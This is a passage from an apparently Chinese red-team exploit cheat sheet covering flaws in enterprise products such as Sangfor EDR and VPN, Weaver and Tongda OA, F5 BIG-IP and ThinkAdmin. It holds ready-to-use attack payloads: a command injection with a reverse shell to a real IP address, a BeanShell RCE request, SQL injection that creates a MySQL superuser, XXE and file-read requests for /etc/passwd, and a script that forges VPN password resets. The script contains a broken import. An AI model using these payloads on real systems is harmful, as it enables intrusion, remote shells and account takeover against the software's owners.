<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post /api/edr/sanforinter/v2/cssp/slog_client?token=ssskbkds HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;&quot;params&quot;:&quot;w=123\&quot;&#x27;1234123&#x27;\&quot;|bash -i &gt;/dev/tcp/167.179.118.219/8899 0&gt;&amp;1&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW12.png"></p>
<p><img src="/img/HW-Vuln/HW13.png"></p>
<h3 id="联软科技产品存在任意文件上传和命令执行漏洞"><a href="#联软科技产品存在任意文件上传和命令执行漏洞" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞"></a>联软科技产品存在任意文件上传和命令执行漏洞</h3><p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。</p>
<p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p>
<h3 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h3><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的Java Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。</p>
<p>利用POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/bsh.servlet.BshServlet HTTP/1.1</span><br><span class="line">Host: xxxxxxxx:8088</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 98</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</span><br></pre></td></tr></table></figure>

<p><code>eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);</code>也可以换成<code>ex\u0065c(&quot;cmd /c dir&quot;);</code>。 </p>
<p><a target="_blank" rel="noopener" href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">CNVD-2019-32204利用脚本</a>。</p>
<h3 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6531">泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库)</a>。</p>
<p>漏洞利用：修改NULL后为要查询的字段名，修改from后为查询的表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2236</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0 d%0a%0d%0a%0</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW14.png"></p>
<h3 id="深信服-VPN-远程代码执行"><a href="#深信服-VPN-远程代码执行" class="headerlink" title="深信服 VPN 远程代码执行"></a>深信服 VPN 远程代码执行</h3><p>深信服vpnweb登录逆向学习：<code>https://www.cnblogs.com/potatsoSec/p/12326356.html</code></p>
<p>漏洞利用：<code>wget -t %d -T %d --spider %s</code></p>
<h3 id="深信服-VPN-口令爆破"><a href="#深信服-VPN-口令爆破" class="headerlink" title="深信服 VPN 口令爆破"></a>深信服 VPN 口令爆破</h3><p><a target="_blank" rel="noopener" href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633">关于SSL VPN认证时的验证码绕过</a>。</p>
<h3 id="常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞"><a href="#常见边界产品-防火墙-网关-路由器-VPN-弱口令漏洞" class="headerlink" title="常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞"></a>常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</h3><p>各厂商防火墙登录IP、初始密码、技术支持：<code>https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA</code>。</p>
<h3 id="Thinkphp-相关漏洞"><a href="#Thinkphp-相关漏洞" class="headerlink" title="Thinkphp 相关漏洞"></a>Thinkphp 相关漏洞</h3><p>Thinkphp是国内很常见的PHP框架，存在远程代码执行&#x2F;sql注入&#x2F;反序列化&#x2F;日志文件泄露等问题。</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="http://zone.secevery.com/article/1165">ThinkPHP漏洞总结</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/">挖掘暗藏ThinkPHP中的反序列利用链</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/81201904">ThinkPHP使用不当可能造成敏感信息泄露</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203461">DSMall代码审计</a></p>
</li>
</ul>
<p>漏洞利用：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">thinkphp v5.x 远程代码执行漏洞-POC集合</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Dido1960/thinkphp">thinkphp反序列化漏洞复现及POC编写</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/whirlwind110/tphack">Thinkphp3&#x2F;5 Log文件泄漏利用工具</a></p>
</li>
</ul>
<h3 id="Spring-系列漏洞"><a href="#Spring-系列漏洞" class="headerlink" title="Spring 系列漏洞"></a>Spring 系列漏洞</h3><p>Spring是java web里最最最最常见的组件了，自然也是研究的热门，好用的漏洞主要是Spring Boot Actuators反序列化。</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">Exploiting Spring Boot Actuators | Veracode blog</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></p>
</li>
</ul>
<p>漏洞利用：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">Spring Boot Actuator (jolokia) XXE&#x2F;RCE</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">A tiny project for generating SnakeYAML deserialization payloads</a></p>
</li>
</ul>
<h3 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h3><p>Solr是企业常见的全文搜索服务，这两年也爆出很多安全漏洞。</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/218730.html">Apache Solr最新RCE漏洞分析</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1009/">Apache Solr DataImportHandler远程代码执行漏洞(CVE-2019-0193)分析</a></p>
</li>
</ul>
<p>漏洞利用：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/solr-injection">Apache Solr Injection Research</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-12409">Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS&#x3D;”true”)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/mogwailabs/mjet">MOGWAI LABS JMX exploitation toolkit</a></p>
</li>
</ul>
<h3 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h3><p>Ghostscript是图像处理中十分常用的库，集成在imagemagick等多个开源组件中，其<code>.ps</code>文件存在沙箱绕过导致代码执行的问题影响广泛，由于上传图片就有可能代码执行，很多大厂中招。</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/157513">ghostscript命令执行漏洞预警</a>。</p>
<p>漏洞利用：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/search?q=Ghostscript">Exploit Database Search</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">CVE-2019-6116</a></p>
</li>
</ul>
<p>如果发现网站可以上传图片，且图片没有经过裁剪，最后返回缩略图，这里就可能存在Ghostscript上传图片代码执行dnslog可以用ping <code>uname</code>.admin.ceye.io或ping <code>whoami</code>.admin.ceye.io保存成图片，以后用起来方便，有个版本的centos和ubuntu poc还不一样，可以这样构造ping <code>whoami</code>.centos.admin.ceye.io &#x2F; ping <code>whoami</code>.ubuntu.admin.ceye.io分别命名为centos_ps.jpg&#x2F;ubuntu_ps.jpg，这样测试的时候直接传2个文件，通过DNSLOG可以区分是哪个poc执行的。</p>
<h3 id="泛微云桥任意文件读取漏洞"><a href="#泛微云桥任意文件读取漏洞" class="headerlink" title="泛微云桥任意文件读取漏洞"></a>泛微云桥任意文件读取漏洞</h3><ul>
<li><p><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt</code></p>
</li>
<li><p><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt</code></p>
</li>
</ul>
<h3 id="网瑞达-WebVPN-RCE-漏洞"><a href="#网瑞达-WebVPN-RCE-漏洞" class="headerlink" title="网瑞达 WebVPN RCE 漏洞"></a>网瑞达 WebVPN RCE 漏洞</h3><p>WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。</p>
<h3 id="Apache-DolphinScheduler-高危漏洞-CVE-2020-11974、CVE-2020-13922"><a href="#Apache-DolphinScheduler-高危漏洞-CVE-2020-11974、CVE-2020-13922" class="headerlink" title="Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]"></a>Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]</h3><p>CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过<code>jdbc connect</code>参数输入<code>&#123;“detectCustomCollations”:true，“ autoDeserialize”:true&#125;</code>在 DolphinScheduler 服务器上远程执行代码。</p>
<p>CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：<code>api interface /dolphinscheduler/users/update</code>。</p>
<p>受影响版本：Apache DolphinScheduler &#x3D; 1.2.0、1.2.1、1.3.1</p>
<p>利用POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /dolphinscheduler/users/update</span><br><span class="line"></span><br><span class="line">id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW15.png"></p>
<p>利用漏洞需要登录权限，提供一组默认密码。该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心。</p>
<p><img src="/img/HW-Vuln/HW16.png"></p>
<p>2、jdbc连接参数就是主角，这里没有限制任意类型的连接串参数。</p>
<p><img src="/img/HW-Vuln/HW17.png"></p>
<p>3、将以下数据添加到jdbc连接参数中，就可以直接触发。</p>
<p><img src="/img/HW-Vuln/HW18.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203086">关于MySQL JDBC客户端反序列化漏洞的相关参考</a>。</p>
<h3 id="宝塔面板-phpMyadmin-未授权访问"><a href="#宝塔面板-phpMyadmin-未授权访问" class="headerlink" title="宝塔面板 phpMyadmin 未授权访问"></a>宝塔面板 phpMyadmin 未授权访问</h3><p>宝塔默认phpMyadmin端口就是888，而这个漏洞排查方式极其简单，访问<code>172.10.0.121:888/pma</code>。如果宝塔是存在安全问题的版本,那就会直接出现phpMyadmin面板页面。</p>
<h3 id="Exchange-Server-远程代码执行漏洞-CVE-2020-16875"><a href="#Exchange-Server-远程代码执行漏洞-CVE-2020-16875" class="headerlink" title="Exchange Server 远程代码执行漏洞 [CVE-2020-16875]"></a>Exchange Server 远程代码执行漏洞 [CVE-2020-16875]</h3><p>只需要一个Exchange用户账号，就能在Exchange服务器上执行任意命令。</p>
<h3 id="PhpStudy-nginx-解析漏洞"><a href="#PhpStudy-nginx-解析漏洞" class="headerlink" title="PhpStudy nginx 解析漏洞"></a>PhpStudy nginx 解析漏洞</h3><p>小皮面板 &lt;&#x3D; 8.1.0.7，其实这个漏洞确实不是phpstudy的问题，而是2017年就出现的nginx解析漏洞。</p>
<p>利用条件就只需要把php恶意文件上传（oss不算!）到服务器。通过<code>/x.txt/x.php</code>方式访问上传的图片地址就解析了php代码。</p>
<p><img src="/img/HW-Vuln/HW19.png"></p>
<h3 id="Apache-Cocoon-XML注入-CVE-2020-11991"><a href="#Apache-Cocoon-XML注入-CVE-2020-11991" class="headerlink" title="Apache Cocoon XML注入 [CVE-2020-11991]"></a>Apache Cocoon XML注入 [CVE-2020-11991]</h3><p>程序使用了StreamGenerator这个方法时，解析从外部请求的xml数据包未做相关的限制，恶意用户就可以构造任意的xml表达式，使服务器解析达到XML注入的安全问题。</p>
<p>漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator，也就是说只要传输的数据被解析就可以实现了。</p>
<p>利用POC：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">ent</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW20.png"></p>
<h3 id="Horde-Groupware-Webmail-Edition-远程命令执行"><a href="#Horde-Groupware-Webmail-Edition-远程命令执行" class="headerlink" title="Horde Groupware Webmail Edition 远程命令执行"></a>Horde Groupware Webmail Edition 远程命令执行</h3><p>来源: <code>https://srcincite.io/pocs/zdi-20-1051.py.txt</code>。</p>
<h3 id="通达OA任意用户登录"><a href="#通达OA任意用户登录" class="headerlink" title="通达OA任意用户登录"></a>通达OA任意用户登录</h3><ul>
<li><p>1、首先访问<code>/ispirit/login_code.php</code>获取<code>codeuid</code></p>
</li>
<li><p>2、访问<code>/general/login_code_scan.php</code>提交 post 参数：<code>uid=1&amp;codeuid=&#123;9E908086-342B-2A87-B0E9-E573E226302A&#125;</code></p>
</li>
</ul>
<p><img src="/img/HW-Vuln/HW21.png"></p>
<ul>
<li>3、最后访问<code>/ispirit/login_code_check.php?codeuid=xxx</code>，这样<code>$_SESSION</code>里就有了登录的信息了。</li>
</ul>
<h3 id="通达OA-v11-7-后台SQL注入"><a href="#通达OA-v11-7-后台SQL注入" class="headerlink" title="通达OA v11.7 后台SQL注入"></a>通达OA v11.7 后台SQL注入</h3><p>利用条件：需要登录权限。</p>
<p><code>/general/hr/manage/query/delete_cascade.php?condition_cascade=select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99))</code></p>
<p>利用链示例：</p>
<ul>
<li>1、添加一个mysql用户：<code>grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></li>
</ul>
<p><img src="/img/HW-Vuln/HW22.png"></p>
<ul>
<li>2、给创建的ateam666账户添加mysql权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `mysql`.`user` SET `Password` = &#x27;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#x27;, `Select_priv` = &#x27;Y&#x27;, `Insert_priv` = &#x27;Y&#x27;, `Up</span><br></pre></td></tr></table></figure>

<ul>
<li><p>3、刷新数据库就可以登录到数据库：<code>/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</code></p>
</li>
<li><p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录：<code>/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</code></p>
</li>
<li><p>5、接下来就是mysql提权</p>
</li>
</ul>
<h3 id="Wordpress-File-manager-插件任意文件上传"><a href="#Wordpress-File-manager-插件任意文件上传" class="headerlink" title="Wordpress File-manager 插件任意文件上传"></a>Wordpress File-manager 插件任意文件上传</h3><p><img src="/img/HW-Vuln/HW23.png"></p>
<p>成功上传后文件访问路径：<code>/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</code></p>
<h3 id="Pligg-CMS远程代码执行-CVE-2020-25287"><a href="#Pligg-CMS远程代码执行-CVE-2020-25287" class="headerlink" title="Pligg CMS远程代码执行 [CVE-2020-25287]"></a>Pligg CMS远程代码执行 [CVE-2020-25287]</h3><p>漏洞非常鸡肋需要登录后台，受影响版本为Pligg2.0.3。</p>
<p><img src="/img/HW-Vuln/HW24.png"></p>
<p>模版编辑器功能可以编辑任意文件内容，在文件中加入恶意代码导致代码执行。</p>
<p><img src="/img/HW-Vuln/HW25.png"></p>
<h3 id="ZeroLogon接管域控权限漏洞-CVE-2020-1472"><a href="#ZeroLogon接管域控权限漏洞-CVE-2020-1472" class="headerlink" title="ZeroLogon接管域控权限漏洞 [CVE-2020-1472]"></a>ZeroLogon接管域控权限漏洞 [CVE-2020-1472]</h3><p>Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。</p>
<p>Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。</p>
<p>该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。</p>
<p>漏洞影响：</p>
<ul>
<li><p>Microsoft Windows Server 2008 R2 SP1</p>
</li>
<li><p>Microsoft Windows Server 2012</p>
</li>
<li><p>Microsoft Windows Server 2012 R2</p>
</li>
<li><p>Microsoft Windows Server 2016</p>
</li>
<li><p>Microsoft Windows Server 2019</p>
</li>
<li><p>Microsoft Windows Server version 2004 (Server Core Installation)</p>
</li>
<li><p>Microsoft Windows Server version 1903 (Server Core Installation)</p>
</li>
<li><p>Microsoft Windows Server version 1909 (Server Core Installation)</p>
</li>
</ul>
<h3 id="ThinkAdminV6-任意文件操作"><a href="#ThinkAdminV6-任意文件操作" class="headerlink" title="ThinkAdminV6 任意文件操作"></a>ThinkAdminV6 任意文件操作</h3><p>目录遍历，注意POST数据包rules参数值需要URL编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.html?s=admin/api.Update/node</span><br><span class="line"></span><br><span class="line">rules=%5B%22.%2F%22%5D</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW26.png"></p>
<p>文件读取，后面那一串是UTF8字符串加密后的结果。计算方式在Update.php中的加密函数。</p>
<p><code>/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34</code></p>
<p><img src="/img/HW-Vuln/HW27.png"></p>
<h3 id="SharePoint远程代码执行-CVE-2020-1181"><a href="#SharePoint远程代码执行-CVE-2020-1181" class="headerlink" title="SharePoint远程代码执行 [CVE-2020-1181]"></a>SharePoint远程代码执行 [CVE-2020-1181]</h3><p>漏洞详情及利用方法见<code>https://www.anquanke.com/post/id/208819</code></p>
<h3 id="深信服-SSL-VPN-任意密码重置"><a href="#深信服-SSL-VPN-任意密码重置" class="headerlink" title="深信服 SSL VPN 任意密码重置"></a>深信服 SSL VPN 任意密码重置</h3><p>深信服VPN加密算法使用了默认的key，攻击者构利用key构造重置密码数据包从而修改任意用户的密码。利用条件需要登录账号。M7.6.6R1版本默认key为20181118，M7.6.1版本默认key为20100720。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Clipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span>	<span class="title function_">myRC4</span>(<span class="params">data,key</span>):</span><br><span class="line">    rc41=ARC4.new(key)</span><br><span class="line">    encrypted=rc41.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrpt_hex</span>(<span class="params">data,key</span>):</span><br><span class="line">    rc41=ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc41.decrypt(a2b_hex(data))</span><br><span class="line"> </span><br><span class="line">key=<span class="string">&#x27;20200720&#x27;</span></span><br><span class="line">data=<span class="string">r&#x27;,username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,&#x27;</span> </span><br><span class="line"><span class="built_in">print</span> myRC4(data,key)</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW28.png"></p>
<p><img src="/img/HW-Vuln/HW29.png"></p>
<p>len为脚本计算后的结果。</p>
<h3 id="深信服-SSL-VPN-修改任意账户手机号"><a href="#深信服-SSL-VPN-修改任意账户手机号" class="headerlink" title="深信服 SSL VPN 修改任意账户手机号"></a>深信服 SSL VPN 修改任意账户手机号</h3><p>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码，利用条件需要登录账号。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW30.png"></p>
<h3 id="通达OA-v11-6-版本RCE漏洞"><a href="#通达OA-v11-6-版本RCE漏洞" class="headerlink" title="通达OA v11.6 版本RCE漏洞"></a>通达OA v11.6 版本RCE漏洞</h3><ul>
<li><p><code>https://www.cnblogs.com/yuzly/p/13600532.html</code></p>
</li>
<li><p><code>https://github.com/TomAPU/poc_and_exp</code></p>
</li>
</ul>
<h3 id="F5负载均衡-RCE-CVE-2020-5902"><a href="#F5负载均衡-RCE-CVE-2020-5902" class="headerlink" title="F5负载均衡 RCE [CVE-2020-5902]"></a>F5负载均衡 RCE [CVE-2020-5902]</h3><p>版本影响：</p>
<ul>
<li><p>BIG-IP 15.x: 15.1.0&#x2F;15.0.0</p>
</li>
<li><p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p>
</li>
<li><p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p>
</li>
<li><p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p>
</li>
<li><p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
</li>
</ul>
<p>远程命令执行RCE：<code>curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;</code></p>
<p><img src="/img/HW-Vuln/HW31.png"></p>
<p><img src="/img/HW-Vuln/HW32.png"></p>
<p><img src="/img/HW-Vuln/HW33.png"></p>
<p>文件包含漏洞：<code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
<p><img src="/img/HW-Vuln/HW34.png"></p>
<h3 id="fastadmin-前台-getshell-csrf-xss"><a href="#fastadmin-前台-getshell-csrf-xss" class="headerlink" title="fastadmin 前台 getshell + csrf + xss"></a>fastadmin 前台 getshell + csrf + xss</h3><h4 id="NO-1-2"><a href="#NO-1-2" class="headerlink" title="NO.1"></a>NO.1</h4><p>需要开启会员中心功能为利用前提条件。登陆会员中心，在个人资料页面中修改个人头像：</p>
<p><img src="/img/HW-Vuln/HW35.png"></p>
<p>抓包后修改图片数据（满足图片头格式即可）：</p>
<p><img src="/img/HW-Vuln/HW36.png"></p>
<p>记录下路径后，成功getshell：</p>
<p><img src="/img/HW-Vuln/HW37.png"></p>
<h4 id="NO-2-2"><a href="#NO-2-2" class="headerlink" title="NO.2"></a>NO.2</h4><p>后台分类管理处存在XSS：</p>
